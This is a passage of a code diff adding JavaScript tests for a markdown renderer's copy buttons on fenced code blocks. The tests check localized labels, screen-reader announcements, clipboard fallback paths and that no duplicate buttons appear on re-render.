+      getSelection: () => ({ removeAllRanges() { doc.selected = null; }, addRange(range) { doc.selected = range.node; } }) }
+  });
+  const root = new Element('div');
+  doc.body.append(root);
+  return { doc, root };
+}
+const sql = `SELECT '<b>' AS tag, "q" & 'x' FROM t\n  WHERE a < 1 AND b > 2;\n-- &amp; stays literal`;
+const brief = ['# Run sheet', '', 'Run `SELECT 1` first.', '', '```sql', sql, '```', '', '```', 'second block', '```'].join('\n');
+const copyT = key => i18n.translator('ko')(key);
+
+test('copy buttons: one per fenced block, none on inline code, and the exact unescaped text is copied', async t => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const { renderMarkdown, addCopyButtons } = await markdownModule();
+  const writes = [], said = [];
+  const { root } = fakeDocument({ clipboard: { writeText: async text => { writes.push(text); } } });
+  root.innerHTML = renderMarkdown(brief);
+  addCopyButtons(root, { t: copyT, announce: text => said.push(text) });
+  const buttons = root.querySelectorAll('button');
+  assert.equal(buttons.length, 2, 'two fenced blocks, two buttons');
+  assert.equal(root.querySelectorAll('p')[0].querySelectorAll('button').length, 0, 'inline code has no button');
+  const [button] = buttons, box = button.parentElement;
+  assert.equal(box.className, 'code-block');
+  assert.deepEqual(box.children.map(node => node.tagName), ['BUTTON', 'PRE'], 'the button sits above the code, outside it');
+  assert.equal(button.type, 'button');
+  assert.equal(button.textContent, '복사');
+  assert.equal(button.dataset.i18nTip, 'copy.tip');
+  await button.click();
+  assert.deepEqual(writes, [sql], 'original text: entities decoded, newlines kept, no trailing newline or label');
+  assert.equal(button.textContent, '복사했어요');
+  assert.deepEqual(said, ['복사했어요']);
+  t.mock.timers.tick(1500);
+  assert.equal(button.textContent, '복사', 'the label comes back after 1.5 s');
+  await buttons[1].click();
+  assert.equal(writes[1], 'second block');
+  assert.equal(said[1], '복사했어요 ', 'a repeated announcement differs so VoiceOver reads it');
+});
+
+test('copy buttons: decorating again or re-rendering never adds a second button', async () => {
+  const { renderMarkdown, addCopyButtons } = await markdownModule();
+  const { root } = fakeDocument({ clipboard: { writeText: async () => {} } });
+  const options = { t: copyT, announce() {} };
+  root.innerHTML = renderMarkdown(brief);
+  addCopyButtons(root, options);
+  addCopyButtons(root, options);
+  assert.equal(root.querySelectorAll('button').length, 2);
+  root.innerHTML = renderMarkdown(brief);
+  addCopyButtons(root, options);
+  assert.equal(root.querySelectorAll('button').length, 2);
+  assert.equal(root.querySelectorAll('pre')[0].textContent, `${sql}\n`, 'the <pre> keeps only the code');
+});
+
+test('copy buttons: without the async clipboard the selection copy runs; when both fail the text is selected', async t => {
+  t.mock.timers.enable({ apis: ['setTimeout'] });
+  const { renderMarkdown, addCopyButtons } = await markdownModule();
+  const insecure = fakeDocument({ clipboard: { writeText: async () => assert.fail('not in an insecure page') }, secure: false, execResult: true });
+  insecure.root.innerHTML = renderMarkdown(brief);
+  addCopyButtons(insecure.root, { t: copyT, announce() {} });
+  await insecure.root.querySelectorAll('button')[0].click();
+  assert.deepEqual(insecure.doc.execs, [['copy', sql]]);
+  assert.equal(insecure.root.querySelectorAll('button')[0].textContent, '복사했어요');
+  assert.equal(insecure.doc.body.querySelectorAll('textarea').length, 0, 'the helper field is removed');
+
+  const said = [];
+  const denied = fakeDocument({ clipboard: { writeText: async () => { throw new Error('denied'); } } });
+  denied.root.innerHTML = renderMarkdown(brief);
+  addCopyButtons(denied.root, { t: key => i18n.translator('en')(key), announce: text => said.push(text) });
+  const button = denied.root.querySelectorAll('button')[0];
+  await button.click();
+  assert.deepEqual(denied.doc.execs, [['copy', sql]], 'a rejected write falls back once');
+  assert.equal(button.textContent, "Couldn't copy — select it yourself");
+  assert.equal(button.dataset.state, 'failed');
+  assert.equal(denied.doc.selected, denied.root.querySelectorAll('pre')[0].firstElementChild, 'the block is selected for ⌘C');
+  assert.match(said[0], /^Couldn't copy/);
+  t.mock.timers.tick(4000);
+  assert.equal(button.textContent, 'Copy');
 });
